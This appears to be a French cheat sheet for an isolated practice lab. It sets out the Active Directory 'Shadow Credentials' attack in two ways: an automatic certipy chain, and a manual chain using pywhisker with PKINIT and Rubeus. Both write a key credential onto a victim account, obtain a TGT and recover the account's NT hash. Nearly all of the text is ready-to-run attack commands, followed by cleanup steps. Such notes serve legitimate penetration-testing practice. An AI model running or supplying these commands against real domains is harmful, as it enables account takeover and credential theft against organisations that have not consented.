# Shadow Credentials — aide-mémoire (lab isolé GOAD-X uniquement)

## Repérage
# BloodHound : edge "AddKeyCredentialLink" vers la cible

## Chaîne automatique (certipy)
certipy shadow auto  -u attacker@dom -p 'pass' -account 'victim$' -dc-ip <dc>
certipy shadow clear -u attacker@dom -p 'pass' -account 'victim$' -dc-ip <dc>   # nettoyage

## Chaîne manuelle (pywhisker + PKINIT)
pywhisker -d dom -u attacker -p 'pass' --target 'victim$' --action add         # -> PFX
# puis gettgtpkinit / Rubeus asktgt /certificate -> TGT -> NT hash
pywhisker -d dom -u attacker -p 'pass' --target 'victim$' --action remove      # nettoyage

## Toujours : nettoyer msDS-KeyCredentialLink après l'exercice.
